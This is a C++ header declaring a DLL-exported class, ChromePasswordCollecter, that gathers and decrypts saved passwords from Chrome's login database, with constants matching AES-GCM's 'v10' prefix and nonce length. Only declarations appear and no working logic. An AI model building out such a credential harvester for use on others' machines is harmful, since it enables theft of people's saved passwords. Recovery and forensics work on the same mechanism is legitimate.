#pragma once
#include "WinApiImport.h"
#include "sqlite3.h"
#include "ChromeCollecter.h"

#include <string>
#include <vector>

#include "Forwards.h"

#ifdef ChromePassEx_EXPORTS

#define EXPORT_F __declspec(dllexport)

	#else

#define EXPORT_F 

#endif


#define V10_LEN 3
#define NONCE_LEN 12



class  EXPORT_F ChromePasswordCollecter : public ChromeCollecter<AccountData>
{	
public:
	ChromePasswordCollecter(): ChromeCollecter<AccountData>(){}
	~ChromePasswordCollecter() override  {
	};
	List<AccountData> collectData() override;

protected:
	void collectFromPath(const String& chromePath) override;
    bool getDbPath(const String& chromePath) override;
	ChromeDecrypt m_decryptor;

};

 

